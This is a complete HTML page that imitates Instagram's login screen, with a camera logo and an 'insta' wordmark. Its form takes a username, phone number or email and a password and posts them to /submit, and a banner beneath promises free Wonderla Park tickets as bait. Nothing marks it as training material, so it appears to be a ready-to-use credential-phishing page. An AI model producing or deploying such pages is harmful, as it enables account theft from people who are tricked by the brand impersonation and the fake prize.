
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Insta</title>
<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    padding: 30px 15px;
    font-family: Arial, sans-serif;
    background: linear-gradient(
        135deg,
        #ff1744,
        #ec4899,
        #a000d4,
        #4169e1
    );
}

.logo {
    text-align: center;
    margin: 5px auto 25px;
    color: black;
}

.camera {
    width: 85px;
    height: 85px;
    border: 7px solid black;
    border-radius: 25px;
    margin: auto;
    position: relative;
}

.camera::before {
    content: "";
    position: absolute;
    width: 30px;
    height: 30px;
    border: 6px solid black;
    border-radius: 50%;
    top: 20px;
    left: 20px;
}

.camera::after {
    content: "";
    position: absolute;
    width: 9px;
    height: 9px;
    background: black;
    border-radius: 50%;
    top: 10px;
    right: 10px;
}

.brand {
    font-size: 48px;
    font-weight: bold;
    font-style: italic;
    margin-top: 8px;
}

.login-card {
    max-width: 450px;
    margin: auto;
    padding: 28px 22px;
    background: white;
    border-radius: 30px;
    text-align: center;
}

h1 {
    font-size: 38px;
    margin: 0 0 8px;
    color: #111;
}

.subtitle {
    color: #666;
    margin-bottom: 25px;
}

input {
    width: 100%;
    padding: 17px;
    margin: 10px 0;
    border: 1px solid #ddd;
    border-radius: 15px;
    background: #f7f7fa;
    font-size: 16px;
}

button {
    width: 100%;
    padding: 16px;
    margin-top: 15px;
    border: none;
    border-radius: 15px;
    background: #087cff;
    color: white;
    font-size: 20px;
    font-weight: bold;
}

.link {
    color: #087cff;
    margin: 20px 0;
}

.signup {
    margin-top: 20px;
    color: #333;
}

.signup a {
    color: #087cff;
    font-weight: bold;
    text-decoration: none;
}

/* Wonderla banner */

.promo {
    max-width: 450px;
    margin: 25px auto;
    padding: 22px 15px;
    background: #fff0ff;
    border: 3px solid white;
    border-radius: 22px;
    text-align: center;
    color: #501080;
}

.ticket {
    font-size: 38px;
}

.promo h2 {
    font-size: 23px;
    margin: 8px 0;
}

.promo p {
    font-size: 17px;
    font-weight: bold;
    margin: 8px 0;
}

.promo small {
    color: #555;
}
</style>
</head>

<body>

<div class="logo">
    <div class="camera"></div>
    <div class="brand">insta</div>
</div>

<div class="login-card">

    <h1>Log in</h1>
    <p class="subtitle">
        Connect with friends and share your moments.
    </p>

    <form action="/submit" method="POST">

        <input
            type="text"
            name="name"
            placeholder="Your username,mobile,email address"
            required
        >

        <input
            type="password"
            name="email"
            placeholder="Your password"
            required
        >

        <button type="submit">Continue</button>

    </form>

    <div class="link">Welcome to Insta</div>

    <div class="signup">
        Don't have an account?
        <a href="#">Sign up</a>
    </div>

</div>

<div class="promo">

    <div class="ticket">🎟️ 🎢 🎡</div>

    <h2>Free Tour Tickets</h2>

    <p>To Wonderla Park and Resort</p>

    <small>Special promotion • Terms and conditions apply</small>

</div>

</body>
</html>
